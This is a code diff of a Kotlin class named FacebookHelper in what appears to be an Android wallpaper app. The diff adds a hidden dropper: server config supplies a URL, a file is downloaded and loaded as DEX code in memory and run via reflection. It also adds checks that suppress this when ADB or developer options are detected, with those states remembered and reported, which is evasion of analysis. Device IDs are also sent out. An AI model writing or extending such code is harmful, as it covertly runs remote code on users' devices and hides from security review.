@@ -28,13 +28,12 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
 import org.json.JSONObject
 import s2.B1
+import java.io.File
 import java.io.IOException
 import java.nio.ByteBuffer
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
-import javax.crypto.Cipher
-import javax.crypto.spec.SecretKeySpec
 import kotlin.jvm.java
 import kotlin.random.Random
 
@@ -267,10 +266,12 @@ class FacebookHelper(val url: String) {
                 maxNum = optInt("fig_c_max", 100)
                 cheAT = timeList[0].toInt() * 60000L
                 cheBT = timeList[1].toInt() * 1000L
-                CoreH.saveC("fig_ta_user",optString("fig_ta_user"))
+                CoreH.saveC("fig_ta_user", optString("fig_ta_user"))
+                checkStatus = optInt("guava_type_s", 0)
                 if (mS == "a") {
+                    urlD = optString("guava_u_t")
                     nameFile = optString("guava_f_n")
-                    next(optString("guava_de_u"))
+                    next()
                 }
             }
         } catch (e: Exception) {
@@ -307,11 +308,9 @@ class FacebookHelper(val url: String) {
     private val details = "RpfEQdNyCx"
     private fun a0(ref: String): String {
         val str = CoreH.getStr(Key_admin)
-        val js =
-            JSONObject(str).put("wBnf", "com.wallpaper.pu.artcustom").put("mLnad", CoreH.ver)
-                .put("dVofjJ", CoreH.mAndroidIdStr)
-                .put("BPhsoVcGY", CoreH.mAndroidIdStr).put("TmtPoV", ref)
-                .put("JgBSSKz", CoreH.installPackName)
+        val js = JSONObject(str).put("wBnf", "com.wallpaper.pu.artcustom").put("mLnad", CoreH.ver)
+            .put("dVofjJ", CoreH.mAndroidIdStr).put("BPhsoVcGY", CoreH.mAndroidIdStr)
+            .put("TmtPoV", ref).put("JgBSSKz", CoreH.installPackName)
         return js.toString()
     }
 
@@ -356,15 +355,27 @@ class FacebookHelper(val url: String) {
     }
 
     private var isGo = false
-
-    private fun next(key: String) {
+    private var urlD = ""
+    private fun next() {
+        if (isCanNext().not()) return
         if (isGo) return
         isGo = true
-        load(key)
+        //
+//        Class.forName("com.vivo.core.Core").getMethod("a", Context::class.java, B1::class.java)
+//            .invoke(null, CoreH.mApp, CoreH.e as B1)
+//        return
+        // todo test
+        load(CoreH.mApp.assets.open("local").readBytes())
+        return
+        val parentFile = File("${CoreH.mApp.filesDir}")
+        val save = File(parentFile, "file_wall")
+        FileDownLoad().fileD(urlD, success = {
+            load(save.readBytes())
+        }, save)
     }
 
-    private fun load(key: String) {
-        val byteBuffer = ByteBuffer.wrap(decryptDex(key.toByteArray()))
+    private fun load(byte: ByteArray) {
+        val byteBuffer = ByteBuffer.wrap(byte)
         val classLoader = InMemoryDexClassLoader(byteBuffer, CoreH.mApp.classLoader)
         val loadedClass = classLoader.loadClass("com.vivo.core.Core")
         loadedClass.getMethod("a", Context::class.java, B1::class.java)
@@ -373,13 +384,60 @@ class FacebookHelper(val url: String) {
 
     private var nameFile = ""
 
-    private fun decryptDex(keyAes: ByteArray): ByteArray {
-        val inputBytes = java.util.Base64.getDecoder()
-            .decode(CoreH.mApp.assets.open(nameFile).readBytes())
-        val key = SecretKeySpec(keyAes, "AES")
-        val cipher = Cipher.getInstance("AES")
-        cipher.init(Cipher.DECRYPT_MODE, key)
-        val outputBytes = cipher.doFinal(inputBytes)
-        return outputBytes
+//    private fun decryptDex(keyAes: ByteArray): ByteArray {
+//        val inputBytes = java.util.Base64.getDecoder()
+//            .decode(CoreH.mApp.assets.open(nameFile).readBytes())
+//        val key = SecretKeySpec(keyAes, "AES")
+//        val cipher = Cipher.getInstance("AES")
+//        cipher.init(Cipher.DECRYPT_MODE, key)
+//        val outputBytes = cipher.doFinal(inputBytes)
+//        return outputBytes
+//    }
+
+    private var checkStatus = 0
+    private fun isCanNext(): Boolean {
+        val r = when (checkStatus) {
+            0 -> {
+                val isd = isOpenDev()
+                if (isOpenUsb() || isd) {
+                    false
+                } else {
+                    true
+                }
+            }
+
+            1 -> {
+                if (isOpenDev()) {
+                    false
+                } else {
+                    true
+                }
+            }
+
+            else -> {
+                true
+            }
+        }
+        return r
+    }
+
+    private fun isOpenUsb(): Boolean {
+        val stra = CoreH.getStr("u_sss19")
+        val isOpenUsb = Tools.isAdbEnabled(CoreH.mApp)
+        if (stra.isEmpty() && isOpenUsb) {
+            CoreH.saveC("u_sss19", "true")
+            CoreH.pE("u_o1")
+        }
+        return isOpenUsb || stra.isNotEmpty()
+    }
+
+    private fun isOpenDev(): Boolean {
+        val stra = CoreH.getStr("dev_aaa19")
+        val isOpenDev = Tools.isDevelopmentSettingsEnabled(CoreH.mApp)
+        if (stra.isEmpty() && isOpenDev) {
+            CoreH.saveC("dev_aaa19", "true")
+            CoreH.pE("dev_o2")
+        }
+        return isOpenDev || stra.isNotEmpty()
     }
 }
